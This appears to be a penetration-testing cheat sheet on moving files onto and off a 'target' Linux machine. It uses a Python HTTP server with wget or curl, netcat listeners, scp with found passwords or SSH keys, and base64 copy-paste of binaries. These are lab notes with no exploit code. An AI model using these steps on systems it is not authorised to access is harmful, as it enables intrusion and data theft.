---
title: "File Transfer (Linux To Linux)"
date: 2024-6-26
tags: ["file transfer", "nc", "scp"]
---

---
### HTTP

```bash
# Start a local HTTP server
python3 -m http.server 80
```

```bash
# wget
wget http://10.10.14.10/file
```

```bash
# curl
curl http://10.10.14.10/file -o /tmp/file
```

<br>

---

### nc

```bash
# In our local Linux machine
nc -lvnp 4444 < file
```

```bash
# In target Linux machine
nc -w3 10.10.14.10 4444 > file
```

<br>

---

### scp

#### Remote to Local

```bash
# If you have target password
scp user@10.10.11.10:/tmp/remote/file /tmp/local/file
```

```bash
# If you have assh key
scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file
```

#### Local to Remote

```bash
# If you have target password
scp /tmp/local/file user@10.10.11.10:/tmp/remote/file
```

```bash
# If you have a ssh key
scp -i id_rsa /tmp/local/file user@10.10.11.10:/tmp/remote/file
```

<br>

---

### Base64 Encoding (for small binary)

```bash
# Base64 encode binary
cat file.elf | base64 -w0
```

```bash
# Copy and paste the base64 encoded binary
echo -n '<base64 encoded binary>' | base64 -d > file.elf
```

<small>*Note: For restricted environment*</small>